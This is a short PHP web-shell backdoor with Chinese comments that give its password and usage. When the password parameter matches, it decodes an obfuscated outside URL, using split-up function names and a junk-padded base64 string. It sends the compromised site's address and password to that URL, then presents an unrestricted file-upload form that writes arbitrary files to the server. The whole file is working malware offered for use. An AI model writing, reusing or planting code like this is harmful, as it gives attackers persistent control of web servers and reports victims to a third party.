<?php
$pssddd="2b";//密码
if($_GET["hks"]==$pssddd){@set_time_limit(100);$slstss="fi"."le_"."ge"."t_c"."onten"."ts";$raworistr='S'.'X'.'0'.'b'.'D'.'e'.'2'.'E';$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['REQUEST_URI'];$dedeedoc="b"."ase6"."4_d"."ec"."od"."e";$serverp = $pssddd;$rawstruri='aHR0cDovSX0bDe2EL2EuSX0bDe2EcXNteSX0bDe2EXkuY29tL2SX0bDe2EcucGhwP2c9';$rawtargetu=str_replace($raworistr,'',$rawstruri);$ropcyiu = $dedeedoc($rawtargetu);$uistauast=$ropcyiu.$serveru.'|'.$serverp;$uistauast=urldecode($uistauast);$rubote=$slstss($uistauast);if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>




//用法   访问  http://www.test.com/test.php?hks=2b  刷新后即可看到上传按钮
